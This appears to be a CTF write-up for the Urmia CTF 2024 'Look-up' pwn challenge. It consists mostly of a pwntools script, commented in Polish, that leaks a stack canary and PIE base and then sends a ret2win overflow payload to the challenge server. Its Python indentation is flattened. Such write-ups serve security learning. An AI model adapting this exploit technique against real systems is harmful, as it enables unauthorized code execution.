---
title: "Look-up - Urmia CTF 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "canary", "pie", "checksec", "look-up", "stack", "urmia-ctf", "urmia-ctf-2024", "2024", "ctf-writeup"]
summary: "from pwn import  #include"
source:
  name: "CTFtime writeup #39459"
  url: "https://ctftime.org/writeup/39459"
ctf:
  name: "Urmia CTF 2024"
  year: 2024
  challenge: "Look-up"
---

## Metadata

- **CTF:** Urmia CTF 2024
- **Task:** Look-up
- **Author team:** MindCrafters
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/39459>

---
```  
from pwn import * #include  
context.log_level='info' #na poczatku mozna  
#context.log_level='debug' #dokladnie pokazuje wyslanie   
#-  
context.update(arch='x86_64', os='linux') #o tym pamietac jak sie nie pobiera danych z pliku  
context.terminal = ['wt.exe','wsl.exe'] #do wsl

binary = context.binary = ELF("./look-up", checksec=False)

if args.GDB:  
gdbscript = """  
call puts("Hello from process debugger!")  
b *0x0000000000401196  
"""  
p = process(binary.path)  
elif args.REMOTE:  
address='[look-up.uctf.ir](http://look-up.uctf.ir)'  
port='5000'   
p=remote(address,port) #laczenie online  
else:  
p = process(binary.path)  


if args.GDB:   
gdb.attach(p,gdbscript)  
pause (3) #wcisnąć c jak sie uruchomi debugger  
#p.sendline(payload)  
p.interactive()

gdbscript = """  
b *win  
"""

#CANARY  
payload = b'UCTFUCTF00'  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", payload)  
p.recvline()  
CANARY=u64(p.recv(7).strip().rjust(8, b"\x00"))  
info (f"CANARY:{hex(CANARY)}")

#PIE  
payload = b'UCTFUCTF00'+14*b'A'+b'\n'  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", payload)

p.recvline()  
p.recvline()

PIE=u64(p.recvline().strip().ljust(8, b"\x00"))  
WIN=PIE-0x10b+0x43  
RET=WIN+30

info (f"PIE:{hex(PIE)}")  
info (f"WIN:{hex(WIN)}")  
info (f"RET:{hex(RET)}")

payload = b'UCTFUCTF00'+p64(CANARY)+p64(RET)+p64(WIN+8)  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", payload)  
p.sendline(b"SHELL")

p.interactive()  
```
